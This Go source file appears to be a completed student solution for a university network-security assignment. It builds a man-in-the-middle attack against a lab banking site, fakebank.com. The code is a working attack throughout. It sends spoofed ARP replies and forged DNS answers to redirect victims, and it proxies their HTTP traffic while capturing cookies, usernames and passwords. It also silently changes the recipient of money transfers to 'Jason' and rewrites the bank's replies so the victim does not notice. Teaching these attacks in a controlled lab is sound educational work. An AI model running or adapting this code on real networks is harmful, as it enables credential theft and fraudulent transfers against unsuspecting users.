/*
 * HKUST COMP4634 Project 3 Networking Part 3. Monster-in-the-Middle Attack
 *
 * mitm.go When completed (by you!) and compiled, this program will:
 *
 * * Intercept and spoof DNS questions for fakebank.com to instead direct the
 *   client towards the attacker's IP.
 *
 * * Act as an HTTP proxy, relaying the client's requests to fakebank.com and
 *   sending fakebank.com's response back to the client... but with an evil
 *   twist.
 *
 * The segments left to you to complete are marked by TODOs. It may be useful
 * to search for them within this file. Lastly, don't dive blindly into coding
 * this part. READ THE STARTER CODE! It is documented in detail for a reason.
 *
 * This project based on the University of Michigan EECS388 Course Project.
 */

package main

// These are the imports we used, but feel free to use anything from gopacket
// or the Go standard libraries. YOU MAY NOT import other third-party
// libraries, as your code may fail to compile on the autograder.

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	comp4634 "fakebank.com/mitm/network" // For `comp4634.*` methods
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/sys/unix"
)

// Constants for setting IP addresses in packets
var (
	DNS_IP         = net.IPv4(10, 38, 8, 2)
	LOCAL_IP, _, _ = net.ParseCIDR(comp4634.GetLocalIP())
	verbose        = false
)

// Just my own useful function for logging, ignore it...
func print_log(format string, a ...any) {
	if verbose {
		fmt.Fprintf(os.Stderr, format, a...)
	}
}

// ==============================
//  ARP MITM PORTION
// ==============================

func startARPServer() {
	// see startDNSServer() for details on these packet operations
	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Panic(err)
	}
	if err := handle.SetBPFFilter("arp and arp[6:2] = 1"); err != nil { // only grab ARP Request Frames
		log.Panic(err)
	} else {
		defer handle.Close()
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for pkt := range packetSource.Packets() {
			handleARPPacket(pkt)
		}
	}
}

/*
 *	handleARPPacket detects ARP requests and sends out spoofed ARP responses
 *
 *	Parameters: a packet captures on the network which may or may not be an ARP packet
 */
func handleARPPacket(packet gopacket.Packet) {
	arpLayer := packet.Layer(layers.LayerTypeARP)
	if arpLayer == nil {
		panic("unable to decode ARP packet")
	}

	// Manually extract the payload of the ARP layer and parse it.
	arpPacketObj := gopacket.NewPacket(arpLayer.LayerContents(), layers.LayerTypeARP, gopacket.Default)

	// Check if the Ethernet frame contains a ARP request within.
	if arpLayer := arpPacketObj.Layer(layers.LayerTypeARP); arpLayer != nil {
		// Type-switch the layer to the correct interface in order to operate on its member variables.
		arpData, _ := arpLayer.(*layers.ARP)
		print_log("ARP received: who is %v, tell %v", net.IP(arpData.DstProtAddress), net.IP(arpData.SourceProtAddress))

		// Check if the packet is request and not response
		isRequest := arpData.Operation == 1
		// Check if request is not made by me myself
		isMyOwn := bytes.Equal(arpData.SourceHwAddress, comp4634.GetLocalMAC())
		// Check if request is intended to reach DNS server
		isToDNS := net.IP(arpData.DstProtAddress).Equal(DNS_IP.To4())
		print_log("\tis request: %v, my own ARP: %v, ARP to DNS: %v", isRequest, isMyOwn, isToDNS)

		// Only grab ARP requests that did not originate from us
		if isRequest && !isMyOwn && isToDNS {
			interdata := ARPIntercept{srcIP: arpData.SourceProtAddress, srcMAC: arpData.SourceHwAddress}
			spoofdata := spoofARP(interdata)
			sendRawEthernet((spoofdata))
		}
	}
}

/*
 * ARPIntercept stores information from a captured ARP packet
 * in order to craft a spoofed ARP reply
 */
type ARPIntercept struct {
	// We only need client IP address
	srcIP net.IP
	// ... and also client MAC address
	srcMAC net.HardwareAddr
}

/*
 * spoofARP is called by handleARPPAcket upon detection of an ARP request
 * for an IP address. Your goal is to make an ARP reply that seems like
 * it came from the requested IP address claiming that the requested IP
 * can be reached at your MAC address
 *
 * Parameters:
 *
 *   - intercept, a strict of information about the original ARP request
 *
 *     Returns: the spoofed ARP reply as a slice of bytes
 */
func spoofARP(intercept ARPIntercept) []byte {
	// In order to make a packet with the spoofed ARP reply, we need to
	// create a spoofed ARP reply and an Ethernet frame to send it in
	// We will need to fill in the headers for both Ethernet and ARP

	localMAC := comp4634.GetLocalMAC()

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6, // number of bytes in a MAC address
		ProtAddressSize:   4, // number of bytes in an IPv4 address
		Operation:         2, // Indicates this is an ARP reply
		SourceHwAddress:   localMAC,
		SourceProtAddress: DNS_IP.To4(),
		DstHwAddress:      intercept.srcMAC,
		DstProtAddress:    intercept.srcIP,
	}
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,
		SrcMAC:       localMAC,
		DstMAC:       intercept.srcMAC,
	}

	// Now that the packet is ready to be sent, we need to "flatten" its
	// different layers into raw bytes to send along the wire.
	// These options will automatically calculate checksums and set them
	// to the correct values
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ethernet, arp); err != nil {
		log.Panic(err)
	}
	return buf.Bytes()
}

/*
 * sendRawEthernet is a helper function that sends bytes directly over the wire
 *
 * Parameters:
 *   - toSend, the raw byte to send on the wire
 */
func sendRawEthernet(toSend []byte) {
	// Open aw raw Ethernet socket
	outFD, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, unix.ETH_P_ALL)
	if err != nil {
		log.Panic(err)
	}

	// The man page says we need Protocol, Ifindex, Halen, and Addr
	// But it doesn't seem to be using protocol, halen, or addr
	// Citation: man 7 packet
	addr := unix.SockaddrLinklayer{}
	addr.Protocol = unix.ETH_P_ARP

	inter, _ := net.InterfaceByName("eth0")
	addr.Ifindex = inter.Index

	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic("Sendto: ", err.Error())
	}
	if err := unix.Close(outFD); err != nil {
		log.Panic("Close: ", err.Error())
	}
}

// ==============================
//  DNS MITM PORTION
// ==============================

func startDNSServer() {
	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Panic(err)
	}
	// NB!! Make sure we only capture IPv4 UDP packets (in order not to check it later)
	if err := handle.SetBPFFilter("ip and udp"); err != nil { // only grab UDP packets
		// More on BPF filtering:
		// https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
		log.Panic(err)
	} else {
		// close PCAP connection when program exits
		defer handle.Close()
		// Loop over each UDP packet received
		// Note: This will iterate over _all_ UDP packets.
		// Not all are guaranteed to be DNS packets.
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for pkt := range packetSource.Packets() {
			handleUDPPacket(pkt)
		}
	}
}

/*
 * handleUDPPacket detects DNS packets and sends a spoofed DNS response as appropriate.
 *
 * Parameters: packet, a packet captured on the network, which may or may not be DNS.
 */
func handleUDPPacket(packet gopacket.Packet) {
	// If UDP is present, we can safely assume IP is also present
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	ipData := ipLayer.(*layers.IPv4)
	if ipLayer == nil {
		panic("unable to decode IP/UDP packet")
	}

	// Due to the BPF filter set in main(), we can assume a UDP layer is present.
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer == nil {
		panic("unable to decode UDP packet")
	}

	// Manually extract the payload of the UDP layer and parse it as DNS.
	udpData := udpLayer.(*layers.UDP)
	payload := udpData.Payload
	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)

	// Check if the UDP packet contains a DNS packet within. Do nothing for non-DNS UDP packets
	if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {
		// Type-switch the layer to the correct interface in order to operate on its member variables.
		dnsData, _ := dnsLayer.(*layers.DNS)
		print_log("IP+UDP+DNS received from %v", ipData.SrcIP)

		// Check if DNS is request and not response
		isAnswer := dnsData.QR
		// Check if question count is more than 0 (otherwise what is the request for??)
		hasQuestions := dnsData.QDCount > 0
		// Check if the first question is made to "fakebank.com"
		toBank := string(dnsData.Questions[0].Name) == "fakebank.com"
		// Check if request is not made by me myself
		isMyOwn := ipData.SrcIP.Equal(LOCAL_IP.To4())
		print_log("\tis answer: %v, has questions: %v, to bank: %v, is my own: %v", isAnswer, hasQuestions, toBank, isMyOwn)

		if !isAnswer && hasQuestions && toBank && !isMyOwn {
			interdata := dnsIntercept{srcIP: ipData.SrcIP, dstPort: udpData.DstPort, srcPort: udpData.SrcPort, queryName: dnsData.Questions[0].Name}
			spoofdata := spoofDNS(interdata, gopacket.Payload(payload))
			sendRawUDP(int(udpData.SrcPort), ipData.SrcIP, spoofdata)
		}
	}
}

/*
 * dnsIntercept stores the pertinent information from a captured DNS packet
 * in order to craft a response in spoofDNS.
 */
type dnsIntercept struct {
	// We need client IP address
	srcIP net.IP
	// and also server UDP port
	dstPort layers.UDPPort
	// and also client IP address
	srcPort layers.UDPPort
	// and finally website address in question
	queryName []byte
}

/*
 * spoofDNS is called by handleUDPPacket upon detection of a DNS request for
 * "fakebank.com". Your goal is to make a packet that seems like it came from the
 * genuine DNS server, but instead lies to the client that fakebank.com is at the
 * attacker's IP address.
 *
 * Parameters:
 *
 *   - intercept, a struct containing information from the original DNS request
 *     packet
 *
 *   - payload, the application (DNS) layer from the original DNS request
 *
 * Returns: the spoofed DNS answer packet as a slice of bytes
 */
func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
	// In order to make a packet containing the spoofed DNS answer, we need
	// to start from layer 3 of the OSI model (IP) and work upwards, filling
	// in the headers of the IP, UDP, and finally DNS layers.

	ip := &layers.IPv4{
		// fakebank.com operates on IPv4 exclusively.
		Version:  4,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    DNS_IP.To4(),
		DstIP:    intercept.srcIP,
	}
	udp := &layers.UDP{
		SrcPort: intercept.dstPort,
		DstPort: intercept.srcPort,
	}

	// The checksum for the level 4 header (which includes UDP) depends on
	// what level 3 protocol encapsulates it; let UDP know it will be wrapped
	// inside IPv4.
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		log.Panic(err)
	}
	// As long as payload contains DNS layer data, we can convert the
	// sequence of bytes into a DNS data structure.
	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).Layer(layers.LayerTypeDNS)
	dns, ok := dnsPacket.(*layers.DNS)
	if !ok {
		log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
	}

	// Do the same thing DNS server was doing basically
	var dnsAnswer layers.DNSResourceRecord
	dnsAnswer.Type = layers.DNSTypeA
	dnsAnswer.IP = LOCAL_IP.To4()
	dnsAnswer.Name = intercept.queryName
	dnsAnswer.Class = layers.DNSClassIN
	dns.QR = true
	dns.ANCount = 1
	dns.ResponseCode = layers.DNSResponseCodeNoErr
	dns.Answers = append(dns.Answers, dnsAnswer)

	// Now we're ready to seal off and send the packet.
	// Serialization refers to "flattening" a packet's different layers into a
	// raw stream of bytes to be sent over the network.
	// Here, we want to automatically populate length and checksum fields with the correct values.
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
		log.Panic(err)
	}
	return buf.Bytes()
}

/*
 * sendRawUDP is a helper function that sends bytes over UDP to the target host/port
 * combination.
 *
 * Parameters:
 * - port, the destination port.
 * - dest, destination IP address.
 * - toSend - the raw packet to send over the wire.
 *
 * Returns: None
 */
func sendRawUDP(port int, dest []byte, toSend []byte) {
	// Opens an IPv4 socket to destination host/port.
	outFD, _ := unix.Socket(unix.AF_INET, unix.SOCK_RAW,
		unix.IPPROTO_RAW)
	var destArr [4]byte
	copy(destArr[:], dest)
	addr := unix.SockaddrInet4{
		Port: port,
		Addr: destArr,
	}
	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic(err)
	}
	if err := unix.Close(outFD); err != nil {
		log.Panic(err)
	}
}

// ==============================
//  HTTP MITM PORTION
// ==============================

/*
 * startHTTPServer sets up a simple HTTP server to masquerade as fakebank.com, once DNS spoofing is successful.
 */
func startHTTPServer() {
	http.HandleFunc("/", handleHTTP)
	log.Panic(http.ListenAndServe(":80", nil))
}

/*
 * handleHTTP is called every time an HTTP request arrives and handles the backdoor
 * connection to the real fakebank.com.
 *
 * Parameters:
 * - rw, a "return envelope" for data to be sent back to the client;
 * - r, an incoming message from the client
 */
func handleHTTP(rw http.ResponseWriter, r *http.Request) {

	if r.URL.Path == "/kill" {
		os.Exit(1)
	}

	for _, element := range r.Cookies() {
		comp4634.StealClientCookie(element.Name, element.Value)
	}

	client := &http.Client{}
	spoofedreq := spoofBankRequest(r)
	spoofedres, _ := client.Do(spoofedreq)

	for _, element := range spoofedres.Cookies() {
		comp4634.StealClientCookie(element.Name, element.Value)
	}

	writeClientResponse(spoofedres, r, &rw)
}

/*
 * spoofBankRequest creates the request that is actually sent to fakebank.com.
 *
 * Parameters:
 * - origRequest, the request received from the bank client.
 *
 * Returns: The spoofed packet, ready to be sent to fakebank.com.
 */
func spoofBankRequest(origRequest *http.Request) *http.Request {
	var bankRequest *http.Request
	var bankURL = "http://" + comp4634.GetBankIP() + origRequest.RequestURI

	if origRequest.URL.Path == "/login" {

		origRequest.ParseForm()
		comp4634.StealCredentials(origRequest.Form.Get("username"), origRequest.Form.Get("password"))
		bankRequest, _ = http.NewRequest("POST", bankURL, strings.NewReader(origRequest.Form.Encode()))

	} else if origRequest.URL.Path == "/logout" {

		// Since the client is just logging out, don't do anything major here
		bankRequest, _ = http.NewRequest("POST", bankURL, nil)

	} else if origRequest.URL.Path == "/transfer" {

		var origuser *string
		origRequest.ParseForm()
		if origRequest.Form.Has("to") {
			oruser := origRequest.Form.Get("to")
			origuser = &oruser
			origRequest.Form.Set("to", "Jason")
		}
		bankRequest, _ = http.NewRequest("POST", bankURL, strings.NewReader(origRequest.Form.Encode()))
		if origRequest.Form.Has("to") {
			origRequest.Form.Set("to", *origuser)
		}

	} else {
		// Silently pass-through any unidentified requests
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
	}

	// Also pass-through the same headers originally provided by the client.
	bankRequest.Header = origRequest.Header
	return bankRequest
}

/*
 * writeClientResponse forms the HTTP response to the client, making in-place modifications
 * to the response received from the real fakebank.com.
 *
 * Parameters:
 * - bankResponse, the response from the bank
 * - origRequest, the original request from the client
 * - writer, the interface where the response is constructed
 *
 * Returns: the same ResponseWriter that was provided (for daisy-chaining, if needed)
 */
func writeClientResponse(bankResponse *http.Response, origRequest *http.Request, writer *http.ResponseWriter) *http.ResponseWriter {

	// Pass any cookies set by fakebank.com on to the client.
	if len(bankResponse.Cookies()) != 0 {
		for _, cookie := range bankResponse.Cookies() {
			http.SetCookie(*writer, cookie)
		}
	}

	if origRequest.URL.Path == "/transfer" {

		var origuser *string
		origRequest.ParseForm()
		if origRequest.Form.Has("to") {
			oruser := origRequest.Form.Get("to")
			origuser = &oruser
		}
		if origuser != nil {
			resp, _ := ioutil.ReadAll(bankResponse.Body)
			respstring := strings.ReplaceAll(string(resp), "Jason", *origuser)
			bankResponse.Body = ioutil.NopCloser(bytes.NewReader([]byte(respstring)))
		}

	}

	// Now that all changes are complete, write the body
	if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
		log.Fatal(err)
	}

	return writer
}

func main() {

	// The ARP server is run concurrently as a goroutine
	go startARPServer()

	// The DNS server is also run concurrently as a goroutine
	go startDNSServer()

	startHTTPServer()
}
